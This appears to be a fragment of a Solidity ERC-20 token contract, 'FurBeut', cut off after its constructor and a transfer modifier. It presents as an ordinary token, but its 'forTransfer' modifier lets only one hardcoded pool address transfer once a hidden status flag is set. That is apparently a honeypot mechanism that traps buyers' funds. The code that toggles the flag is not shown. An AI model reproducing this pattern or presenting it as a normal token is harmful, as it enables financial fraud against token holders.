...
contract FurBeutToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenFB_totalSupply;
    uint256 private _tokenFB_status = 0;
    uint256 public stakingPoolFBStatus = 0;

    string private _tokenFB_name;
    string private _tokenFB_symbol;

    address private _poolFBAddress = 0x5925C5F60d76a869E0197D5C48FF52c02d06aE3c;

    constructor() {
        _tokenFB_name = "FurBeut";
        _tokenFB_symbol = "FurBeut";
        _tokenFB_totalSupply = 59700 * 10 ** 18;
        _balances[msg.sender] = _tokenFB_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolFBAddress || _tokenFB_status == 0);
        _;
    }
